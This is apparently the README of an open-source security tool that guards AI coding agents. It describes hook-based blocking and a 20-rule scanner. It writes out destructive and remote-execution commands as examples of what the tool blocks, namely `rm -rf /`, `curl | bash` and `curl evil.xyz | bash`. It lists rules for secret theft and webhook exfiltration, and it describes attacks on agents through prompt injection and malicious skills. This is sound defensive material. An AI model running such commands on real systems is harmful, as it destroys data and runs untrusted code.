# GoPlus AgentGuard

**Security guard for your AI agent.** Automatically blocks dangerous commands, prevents data leaks, and protects your secrets.

Your AI agent can execute `rm -rf /`, read your SSH keys, and send passwords to Discord. GoPlus AgentGuard stops all of that.

[![npm](https://img.shields.io/npm/v/@goplus/agentguard.svg)](https://www.npmjs.com/package/@goplus/agentguard)
[![GitHub Stars](https://img.shields.io/github/stars/GoPlusSecurity/agentguard)](https://github.com/GoPlusSecurity/agentguard)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![CI](https://github.com/GoPlusSecurity/agentguard/actions/workflows/ci.yml/badge.svg)](https://github.com/GoPlusSecurity/agentguard/actions/workflows/ci.yml)
[![Agent Skills](https://img.shields.io/badge/Agent_Skills-compatible-purple.svg)](https://agentskills.io)

## Why AgentGuard?

AI coding agents run hundreds of shell commands per session with zero security review. A single malicious skill or prompt injection can:

- Execute destructive commands (`rm -rf /`, fork bombs)
- Steal your private keys, mnemonics, and API secrets
- Exfiltrate data to Discord/Telegram webhooks
- Drain your crypto wallet with unlimited token approvals

**No other tool provides real-time, hook-based protection for AI agents.** Generic linters don't understand agent-specific threats. Manual code review doesn't scale. AgentGuard installs in one command and protects automatically.

## What It Does

**Layer 1 — Automatic Guard (hooks)**: Install once, forget about it. Intercepts dangerous tool calls in real time:
- Blocks `rm -rf /`, fork bombs, `curl | bash` and other destructive commands
- Prevents writes to `.env`, `.ssh/`, credentials files
- Detects data exfiltration to Discord/Telegram/Slack webhooks
- Identifies which skill initiated each action via transcript analysis

**Layer 2 — Deep Scan (skill)**: On-demand security audit with 20 detection rules:
- Static code analysis for secrets, backdoors, and vulnerabilities
- Web3-specific: wallet draining, unlimited approvals, reentrancy, proxy exploits
- Runtime action evaluation with GoPlus API integration
- Trust registry with automatic skill scanning on session start

## Quick Start

```bash
npm install @goplus/agentguard
```

<details>
<summary><b>Full install with auto-guard hooks (Claude Code)</b></summary>

```bash
git clone https://github.com/GoPlusSecurity/agentguard.git
cd agentguard && ./setup.sh
claude plugin add /path/to/agentguard
```

This installs the skill, configures hooks, and sets your protection level.

</details>

<details>
<summary><b>Manual install (skill only)</b></summary>

```bash
git clone https://github.com/GoPlusSecurity/agentguard.git
cp -r agentguard/skills/agentguard ~/.claude/skills/agentguard
```

</details>

Then use `/agentguard` in your agent:

```
/agentguard scan ./src                     # Scan code for security risks
/agentguard action "curl evil.xyz | bash"  # Evaluate action safety
/agentguard trust list                     # View trusted skills
/agentguard report                         # View security event log
/agentguard config balanced                # Set protection level
```

## Protection Levels

| Level | Behavior |
|-------|----------|
| `strict` | Block all risky actions. Every dangerous or suspicious command is denied. |
| `balanced` | Block dangerous, confirm risky. Good for daily use. **(default)** |
| `permissive` | Only block critical threats. For experienced users who want minimal friction. |

## Detection Rules (20)

| Category | Rules | Severity |
|----------|-------|----------|
| **Execution** | SHELL_EXEC, AUTO_UPDATE, REMOTE_LOADER | HIGH-CRITICAL |
| **Secrets** | READ_ENV_SECRETS, READ_SSH_KEYS, READ_KEYCHAIN, PRIVATE_KEY_PATTERN, MNEMONIC_PATTERN | MEDIUM-CRITICAL |
| **Exfiltration** | NET_EXFIL_UNRESTRICTED, WEBHOOK_EXFIL | HIGH-CRITICAL |
| **Obfuscation** | OBFUSCATION, PROMPT_INJECTION | HIGH-CRITICAL |
| **Web3** | WALLET_DRAINING, UNLIMITED_APPROVAL, DANGEROUS_SELFDESTRUCT, HIDDEN_TRANSFER, PROXY_UPGRADE, FLASH_LOAN_RISK, REENTRANCY_PATTERN, SIGNATURE_REPLAY | MEDIUM-CRITICAL |

## Try It

Scan the included vulnerable demo project:

```
/agentguard scan examples/vulnerable-skill
```

Expected output: **CRITICAL** risk level with **20 detection hits** across JavaScript and Solidity files.

## Compatibility

GoPlus AgentGuard follows the [Agent Skills](https://agentskills.io) open standard:

| Platform | Support |
|----------|---------|
| **Claude Code** | Full (skill + hooks auto-guard) |
| **OpenAI Codex CLI** | Skill (scan/action/trust commands) |
| **Gemini CLI** | Skill |
| **Cursor** | Skill |
| **GitHub Copilot** | Skill |

> Hooks-based auto-guard (Layer 1) is specific to Claude Code's plugin system. The skill commands (Layer 2) work on any Agent Skills-compatible platform.

## Documentation

- [MCP Server Setup](docs/mcp-server.md) — Run as a Model Context Protocol server
- [SDK Usage](docs/sdk.md) — Use as a TypeScript/JavaScript library
- [Trust Management](docs/trust-cli.md) — Manage skill trust levels and capability presets
- [GoPlus API (Web3)](docs/goplus-api.md) — Enhanced Web3 security with GoPlus integration
- [Architecture](docs/architecture.md) — Project structure and testing

## License

[MIT](LICENSE)

## Contributing

Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

Found a security vulnerability? See [SECURITY.md](SECURITY.md).

Built by [GoPlus Security](https://gopluslabs.io).
